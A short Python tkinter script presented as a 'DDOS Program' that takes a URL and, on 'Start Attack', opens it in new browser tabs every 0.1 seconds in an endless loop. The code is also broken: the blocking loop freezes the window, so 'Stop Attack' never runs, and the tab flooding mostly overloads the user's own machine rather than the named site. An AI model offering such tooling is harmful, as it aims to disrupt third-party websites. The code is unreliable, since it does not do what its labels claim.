import tkinter as tk
import webbrowser
import subprocess
import time

class DDOS_GUI:
    def __init__(self, master):
        self.master = master
        master.title("DDOS Program")

        self.label = tk.Label(master, text="Enter URL:")
        self.label.pack()

        self.url_entry = tk.Entry(master)
        self.url_entry.pack()

        self.start_button = tk.Button(master, text="Start Attack", command=self.start_attack)
        self.start_button.pack()

        self.stop_button = tk.Button(master, text="Stop Attack", command=self.stop_attack)
        self.stop_button.pack()

    def start_attack(self):
        self.running = True
        self.url = self.url_entry.get()
        while self.running:
            webbrowser.open_new_tab(self.url)
            time.sleep(0.1)

    def stop_attack(self):
        self.running = False

        # Open task manager to show Google Chrome usage
        subprocess.Popen('taskmgr')

root = tk.Tk()
ddos_gui = DDOS_GUI(root)
root.mainloop()

